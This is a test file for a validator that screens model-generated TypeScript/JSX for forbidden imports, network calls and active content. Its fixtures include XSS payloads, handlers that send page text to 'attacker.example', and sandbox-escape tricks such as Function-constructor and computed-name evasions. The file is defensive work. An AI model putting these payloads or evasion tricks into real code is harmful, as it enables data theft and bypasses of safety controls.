import { describe, expect, it } from 'vitest'
import { GeneratedFileRejectedError } from '../src/generator.js'
import { assertGeneratedImports, assertGeneratedSource } from '../src/import-policy.js'

describe('generated import policy', () => {
  it('accepts only public UI utilities, repositories and other generated files', () => {
    expect(() => assertGeneratedImports([
      { path: 'src/Card.tsx', content: "import Link from 'next/link'; export const Card = () => <a href='/'>Início</a>; void Link" },
      { path: 'src/Page.tsx', content: "export { Card } from './Card'; export { ClienteRepository } from '@/server/repositories/cliente'; import { cn } from '@/lib/utils'" },
      { path: 'src/Form.tsx', content: "import { z } from 'zod'; import { Button } from '@/src/components/ui/button'; void z; void Button" },
    ])).not.toThrow()
  })

  it.each([
    ["import { readFile } from 'node:fs'", 'node:fs'],
    ["import { openDatabase } from '@/src/db/client'", '@/src/db/client'],
    ["const name = 'node:fs'; import(name)", '<dinâmico>'],
    ["const fs = require('node:fs')", 'node:fs'],
    ["import item = require('node:fs')", 'node:fs'],
    ["export * from 'child_process'", 'child_process'],
    ["import { hidden } from '../hidden'", '../hidden'],
  ])('rejects a forbidden dependency as GENERATED_FILE_REJECTED: %s', (content, moduleName) => {
    expect(() => assertGeneratedImports([{ path: 'src/Generated.tsx', content }])).toThrow(GeneratedFileRejectedError)
    expect(() => assertGeneratedImports([{ path: 'src/Generated.tsx', content }])).toThrow(moduleName)
  })

  it('ignores non-code assets and rejects malformed module suffixes', () => {
    expect(() => assertGeneratedImports([{ path: 'content/app.json', content: '{"import":"node:fs"}' }])).not.toThrow()
    expect(() => assertGeneratedImports([{ path: 'src/a.ts', content: "import x from '@/server/repositories/../secret'" }])).toThrow(GeneratedFileRejectedError)
  })

  it('covers JavaScript variants, local index files and exports without a module', () => {
    expect(() => assertGeneratedImports([
      { path: 'src/widget/index.tsx', content: 'export const Widget = () => null' },
      { path: 'src/main.jsx', content: "import React from 'react'; import { Widget } from './widget'; export {}; void React; void Widget" },
      { path: 'src/legacy.mjs', content: "import React from 'react'; void React" },
      { path: 'src/module.cjs', content: "import React from 'react'; void React" },
    ])).not.toThrow()
    expect(() => assertGeneratedImports([{ path: 'src/a.ts', content: 'require()' }])).toThrow('<dinâmico>')
    expect(() => assertGeneratedImports([{ path: 'src/a.ts', content: 'import item = require()' }])).toThrow('<dinâmico>')
  })

  it.each([
    '@/server/repositories/', '@/server/repositories//item', '@/server/repositories/./item',
    '@/server/repositories/../item', '@/src/components/ui//button',
  ])('rejects unsafe allowlist suffix: %s', moduleName => {
    expect(() => assertGeneratedImports([{ path: 'src/a.ts', content: `import value from ${JSON.stringify(moduleName)}` }])).toThrow(GeneratedFileRejectedError)
  })

  it('accepts every explicit protected facade prefix with a safe suffix', () => {
    expect(() => assertGeneratedImports([{ path: 'src/a.ts', content: [
      "import a from '@/src/server/repositories/a'", "import b from '@/server/repositories/b'",
      "import c from '@/src/components/ui/c'", "import d from '@/components/ui/d'", "import e from '@/src/components/generated/contato-manager'", "import f from '@/components/generated/contato-manager'", 'void a; void b; void c; void d; void e; void f',
    ].join(';') }])).not.toThrow()
  })

  it.each([
    ['process', 'export default function App(){return <pre>{String(process.env.APP_SMTP_URL)}</pre>}'],
    ['globalThis', 'export const value = globalThis'],
    ['global', 'export default function App(){return <main>{global.process.env.APP_SMTP_URL}</main>}'],
    ['module', 'export const value = module.exports'],
    ['localStorage', "export const value = localStorage['token']"],
    ['eval', "export const value = eval('1')"],
    ['Function', "export const value = new Function('return 1')"],
    ['import.meta', 'export const value = import.meta.url'],
    ['use server', "'use server'; export async function action(){}"],
    ['dangerouslySetInnerHTML', "export default function App(){return <div dangerouslySetInnerHTML={{__html:'x'}}/>}"],
    ['script', "export default function App(){return <script src='x'/>}"],
    ['iframe', "export default function App(){return <iframe title='x'/>}"],
    ['object', "export default function App(){return <object data='x'/>}"],
  ])('rejects unsafe generated source construct: %s', (construct, content) => {
    expect(() => assertGeneratedSource([{ path: 'src/GeneratedApp.tsx', content }])).toThrow(GeneratedFileRejectedError)
    expect(() => assertGeneratedSource([{ path: 'src/GeneratedApp.tsx', content }])).toThrow(construct)
  })

  it('keeps ordinary client components valid', () => {
    expect(() => assertGeneratedSource([{ path: 'src/GeneratedApp.tsx', content: "'use client'; export default function App(){return <main><h1>Projeto</h1></main>}" }])).not.toThrow()
  })

  it.each([
    ['React.createElement iframe with srcDoc', `import React from 'react'; export default function App(){return React.createElement('iframe',{srcDoc:'<script>location.href="https://example.test"</script>'})}`],
    ['jsx runtime factory', `import { jsx } from 'react/jsx-runtime'; export default function App(){return jsx('iframe',{srcDoc:'<script>alert(1)</script>'})}`],
    ['aliased jsx runtime factory', `import { jsx as h } from 'react/jsx-runtime'; export default function App(){return h('iframe',{srcDoc:'<script>alert(1)</script>'})}`],
    ['aliased React factory', `import React from 'react'; const h=React.createElement; export default function App(){return h('iframe',{srcDoc:'<script>alert(1)</script>'})}`],
    ['computed createElement', `import React from 'react'; export default function App(){return React['create'+'Element']('iframe',{srcDoc:'x'})}`],
    ['srcDoc attribute', `export default function App(){return <div srcDoc={'<script>alert(1)</script>'}/>} `],
    ['meta refresh', `export default function App(){return <meta httpEquiv="refresh" content="0;url=https://example.test"/>}`],
    ['active URL scheme', `export default function App(){return <a href="javascript:alert(1)">abrir</a>}`],
    ['dynamic URL attribute', `const href='java'+'script:location.href="https://attacker.example/?d="+document.body.innerText'; export default function App(){return <a href={href}>Abrir</a>}`],
    ['dynamic intrinsic tag', `const Tag='iframe'; export default function App(){return <Tag/>}`],
    ['spread attributes', `const props={srcDoc:'<script>alert(1)</script>'}; export default function App(){return <div {...props}/>} `],
    ['event handler attribute', `export default function App(){return <svg onLoad={event=>{event.currentTarget.ownerDocument.defaultView!.location.href='https://attacker.example/?d='+event.currentTarget.ownerDocument.body.innerText}}/>}`],
    ['ref callback attribute', `'use client'; export default function App(){return <div ref={element=>{if(element)element.ownerDocument.defaultView!.location.href='https://attacker.example/?d='+element.ownerDocument.body.innerText}}/>}`],
    ['compound JSX member tag', `const script={foo:'script'}; export default function App(){return <script.foo>{'location.href="https://attacker.example/"'}</script.foo>}`],
    ['unknown custom element', `export default function App(){return <remote-widget/>}`],
  ])('rejects element-factory and active-content bypasses: %s', (_case, content) => {
    expect(() => assertGeneratedSource([{ path: 'src/GeneratedApp.tsx', content }])).toThrow(GeneratedFileRejectedError)
  })

  it.each([
    ['function directive', "export async function save(){'use server'; return 1}"],
    ['arrow directive', "export const save = async () => {'use server'; return 1}"],
    ['direct fetch', "export async function load(){return fetch('/api')}"],
    ['indirect fetch', "export async function load(){return (0, fetch)('/api')}"],
    ['window.fetch', "export async function load(){return window.fetch('/api')}"],
    ['window element fetch', "export async function load(){return window['fetch']('/api')}"],
    ['WebSocket', "export const socket = new WebSocket('ws://localhost')"],
    ['window element WebSocket', "export const socket = new window['WebSocket']('ws://localhost')"],
    ['XMLHttpRequest', 'export const request = new XMLHttpRequest()'],
    ['window element XMLHttpRequest', "export const request = new window['XMLHttpRequest']()"],
    ['EventSource', "export const events = new EventSource('/events')"],
    ['window element EventSource', "export const events = new window['EventSource']('/events')"],
    ['computed window fetch', "export async function load(){return window['fet' + 'ch']('/api')}"],
    ['computed window WebSocket', "export const socket = new window['Web' + 'Socket']('ws://localhost')"],
    ['reflective window fetch', "export async function load(){return Reflect.get(window, 'fetch')('/api')}"],
    ['aliased window fetch', "const browser = window; export async function load(){return browser.fetch('/api')}"],
    ['worker self fetch', "const worker = self; export async function load(){return worker['fetch']('/api')}"],
    ['document defaultView fetch', "export async function load(){return Reflect.get(document.defaultView, 'fetch')('/api')}"],
    ['computed document fetch', "export async function load(){return document.defaultView!['fet' + 'ch']('/api')}"],
    ['frames global fetch', "export async function load(){return frames[0]!['fetch']('/api')}"],
    ['indirect Function constructor', "export const global = (()=>{}).constructor('return this')()"],
    ['computed Function constructor', "const global = (()=>{})['con' + 'structor']('return this')(); export const value = global['fet' + 'ch']"],
    ['navigator network access', "export const sent = navigator.sendBeacon('/collect', 'x')"],
    ['forbidden global as property receiver', 'export const value = fetch.name'],
    ['dynamic Function escape', "const key='con'+'structor';const box:any=()=>{};const fn=box[key];export default function App(){const p=fn('return pro'+'cess')();return <main>{JSON.stringify(p.env)}</main>}"],
  ])('rejects nested directives and network access: %s', (_case, content) => {
    expect(() => assertGeneratedSource([{ path: 'src/GeneratedApp.tsx', content }])).toThrow(GeneratedFileRejectedError)
  })

  it('does not treat comments or ordinary strings as executable constructs', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/GeneratedApp.tsx',
      content: [
        "// fetch, WebSocket, XMLHttpRequest, EventSource and 'use server' are documentation terms",
        "export const help = \"Do not call fetch or add a 'use server' directive\"",
        'export default function App(){return <p>{help}</p>}',
      ].join('\n'),
    }])).not.toThrow()
  })

  it('does not reject harmless object and type property labels', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/GeneratedApp.tsx',
      content: "interface Labels { fetch: string; WebSocket: string } export const labels: Labels = { fetch: 'buscar', WebSocket: 'tempo real' }",
    }])).not.toThrow()
  })

  it('rejects non-static application property lookup', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/GeneratedApp.tsx',
      content: "const labels = { status: 'Tudo certo' }; const key = 'status'; export const values = [labels[key as keyof typeof labels], labels[key + 'x' as keyof typeof labels], labels['x' + key as keyof typeof labels]]",
    }])).toThrow('dynamic property access')
  })

  it('accepts harmless method, class and wrapped property labels', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/GeneratedApp.ts',
      content: [
        "interface Labels { fetch: string; WebSocket(): void }",
        "class LabelsImpl { fetch = 'buscar'; WebSocket() {} }",
        "const labels = { status: 'Tudo certo', fetch: 'buscar', WebSocket() {} }",
        "export const values = [labels.status, labels[('status')], labels['status' as string], labels[<'status'>'status'], labels['status'!], labels['status' satisfies string]]",
      ].join(';'),
    }])).not.toThrow()
  })

  it('still rejects a forbidden global hidden behind shorthand syntax', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/GeneratedApp.tsx', content: 'export const globals = { fetch }',
    }])).toThrow(GeneratedFileRejectedError)
  })

  it('does not trust a component imported from another model-generated file', () => {
    expect(() => assertGeneratedSource([
      { path: 'src/tag.ts', content: "const Tag='script'; export default Tag" },
      { path: 'src/app.tsx', content: "import Tag from './tag'; export default function App(){return <Tag>{'alert(1)'}</Tag>}" },
    ])).toThrow('dynamic JSX tag Tag')
  })

  it('does not let model output replace a trusted Studio component through an alias', () => {
    expect(() => assertGeneratedSource([
      { path: 'src/components/ui/tag.ts', content: "const Tag='script'; export default Tag" },
      { path: 'src/app.tsx', content: "import Tag from '@/src/components/ui/tag'; export default function App(){return <Tag>{'location.href=\"https://attacker.example/\"'}</Tag>}" },
    ])).toThrow('reserved Studio component path')
  })

  it('does not trust a generated absolute alias even outside reserved component paths', () => {
    expect(() => assertGeneratedSource([
      { path: 'src/card.ts', content: "const Card='script'; export default Card" },
      { path: 'src/app.tsx', content: "import Card from '@/src/card'; export default function App(){return <Card>{'alert(1)'}</Card>}" },
    ])).toThrow(GeneratedFileRejectedError)
  })

  it('allows a component imported from a fixed Studio facade', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/app.tsx', content: "import { SchedulingPanel } from '@/src/components/generated'; export default function App(){return <SchedulingPanel/>}",
    }])).not.toThrow()
  })

  it('rejects a tagged-template call through an allowed import alias', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/app.tsx', content: "import { redirect as go } from 'next/navigation'; export default function App(){return go`https://attacker.example/`}",
    }])).toThrow('tagged template call')
  })

  it.each([
    ['factory identifier value', 'export const h=jsx', 'jsx'],
    ['factory import specifier', "import { jsx as h } from 'react'; export const value=h", 'jsx'],
    ['factory import without alias', "import { jsx } from 'react'; export const value=jsx", 'jsx'],
    ['computed factory property', "const ui={createElement:'x'}; export const value=ui['createElement']", 'createElement'],
    ['escape property', 'const box={constructor:1}; export const value=box.constructor', 'constructor'],
    ['computed escape property', "const box={constructor:1}; export const value=box['constructor']", 'constructor'],
    ['ordinary runtime call', "export const value=String('x')", 'runtime call'],
    ['ordinary constructor', 'export const value=new Date()', 'runtime constructor'],
    ['empty URL expression', 'export default function App(){return <a href={}>Abrir</a>}', 'dynamic URL attribute href'],
  ])('covers each declarative-policy rejection: %s', (_case, content, message) => {
    expect(() => assertGeneratedSource([{ path: 'src/app.tsx', content }])).toThrow(message)
  })

  it('accepts the remaining static facade and property forms', () => {
    expect(() => assertGeneratedSource([{
      path: 'src/app.tsx',
      content: "import * as Generated from '@/src/components/generated'; const labels={1:'um'}; export const value=labels[1]; export default function App(){return <Generated/>}",
    }])).not.toThrow()
    expect(() => assertGeneratedSource([{
      path: 'src/app.tsx', content: "export default function App(){return <a href title='Abrir'>Abrir</a>}",
    }])).not.toThrow()
  })

  it.each([
    "const key='a'; const box={}; export const value=box[key+'x']",
    "const key='a'; const box={}; export const value=box['x'+key]",
  ])('rejects both non-static sides of a computed property', content => {
    expect(() => assertGeneratedSource([{ path: 'src/app.ts', content }])).toThrow('dynamic property access')
  })
})
